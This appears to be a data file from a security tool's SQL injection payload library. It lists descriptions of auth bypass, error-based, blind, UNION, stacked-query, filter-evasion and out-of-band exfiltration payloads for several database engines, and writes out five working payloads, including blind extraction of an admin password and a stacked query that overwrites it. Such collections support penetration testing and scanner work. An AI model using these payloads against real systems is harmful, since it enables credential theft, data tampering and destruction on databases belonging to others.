meta.name: SQL Injection
meta.description: SQL injection payloads for MySQL, MSSQL, PostgreSQL, Oracle, and SQLite. Covers auth bypass, error-based, boolean/time blind, UNION, stacked queries, filter bypasses, and OOB exfiltration.

payloads.description: Classic single-quote tautology auth bypass
Auth bypass with inline comment neutralizing rest of query
Username-only bypass — terminates password check via comment
Numeric tautology auth bypass with comment
Bracket-adjusted auth bypass for queries with closing parens
MySQL EXTRACTVALUE error extraction — version leaks in XML parse error
MySQL UPDATEXML error extraction — DB user leaked in error

payloads.code: ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
payloads.description: MySQL FLOOR+RAND GROUP BY duplicate-key error extraction
MSSQL CONVERT type error — leaks first table name
PostgreSQL CAST type error — leaks version string in error
MySQL NAME_CONST duplicate-column error extraction
Boolean TRUE probe — baseline for blind injection detection
Boolean FALSE probe — response difference confirms blind injection
Char-by-char extraction — tests first character of username field

payloads.code: ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
payloads.description: ASCII binary search extraction on first password character
Probe information_schema access via boolean result

payloads.code: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
payloads.description: Blind extraction of admin password first character
MySQL time-based blind — 5 second delay via SLEEP()
MSSQL time-based blind — 5s delay via WAITFOR DELAY
PostgreSQL time-based blind via pg_sleep()
MySQL conditional SLEEP — delays only on true condition
MySQL SLEEP in subquery — alternative syntax evading simple filters
UNION NULL column probe — increment NULLs until error disappears
Two-column UNION probe
Three-column UNION probe
String column finder — replace NULLs with 'a' to find string columns
Credential dump via UNION SELECT (3-column example)
Table enumeration via UNION + information_schema

payloads.code: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
payloads.description: Column enumeration for users table via UNION
Stacked DDL — drops users table (requires stacked query support)
Stacked INSERT — adds attacker-controlled user account

payloads.code: '; UPDATE users SET password='pwned' WHERE username='admin'--
payloads.description: Stacked UPDATE — overwrites admin password
MSSQL xp_cmdshell OS command execution (requires SA privileges)
Inline comment space bypass — /**/ replaces spaces to evade space filters
Mixed-case bypass for case-sensitive keyword filters
URL-encoded payload — %27=' %20=space %3D== for WAF bypass
MySQL versioned comment keyword bypass — executes inside /*!*/
Tab-character whitespace bypass (%09 = tab)
CHAR() encoding bypass — spells 'user' without string literals
MySQL OOB DNS exfil via LOAD_FILE UNC path (requires FILE privilege)
MSSQL OOB DNS trigger via xp_dirtree UNC path traversal
MySQL LOAD_FILE local file read via SQLi (requires FILE privilege)
